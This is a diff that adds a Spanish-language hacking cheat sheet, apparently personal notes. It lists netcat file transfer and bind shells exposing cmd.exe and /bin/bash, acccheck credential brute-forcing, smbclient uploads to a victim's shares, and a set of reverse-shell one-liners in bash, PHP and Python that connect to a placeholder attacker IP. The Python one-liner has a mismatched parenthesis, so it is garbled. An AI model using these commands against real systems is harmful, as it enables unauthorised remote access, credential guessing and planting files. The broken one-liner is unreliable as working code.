@@ -1,0 +1,36 @@
+Webserver con webdav -> cadaver [url]
+	Dentro del webserver, para subir archivos -> put [ubicación]
+
+Transferencia de archivos
+    nc -lvp [puerto] > [archivo a guardar]
+    nc -vv [ip] [puerto] < [archivo]
+
+
+Conectarte a programa y redireccionar salida por nc
+    nc -lvvp [puerto] -e cmd.exe
+    nc -v [ip] [puerto]
+
+
+Conectar programa a servidor en escucha y redireccionar salida por nc
+    nc -lvvp [puerto]
+    nc -v [ip] [puerto] -e /bin/bash
+
+
+acccheck -t [IP target] -u [username]/ -U [usernames file] -p [password]/ -P [passwords file] (Prueba credenciales para inicio de sesión remota)
+
+smbclient -U [username] -L [IP target]
+	Para acceder a los directorios -> smbclient \\\\[IP Target]\\[Share al que accedemos, carpeta compartida o Share por defecto] -U [username]
+	put [archivo] (sube el archivo al directorio del ordenador víctima)
+
+
+Reverse shell
+    Recibida con nc -vvv -n -l -p PUERTO
+    bash -i >& /dev/tcp/IP_DESTINO/NUM_PUERTO 0>&1
+    php -r '$sock=fsockopen("IP",Puerto);exec("/bin/sh -i <&3 >&3 2>&3");'
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",Port));os.dup2(s.fileno(),0;os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    0<&196;exec 196<>/dev/tcp/IP/PUERTO; sh <&196 >&196 2>&196&		(el & final la pone en background)
+    exec 5<>/dev/tcp/IP/PUERTO cat <&5 | while read line; do $line 2>&5 >&5; done&		(el & final la pone en background)
+
+
+Conectarse por mysql
+	mysql -uUSUARIO -pPASSWORD -h HOST
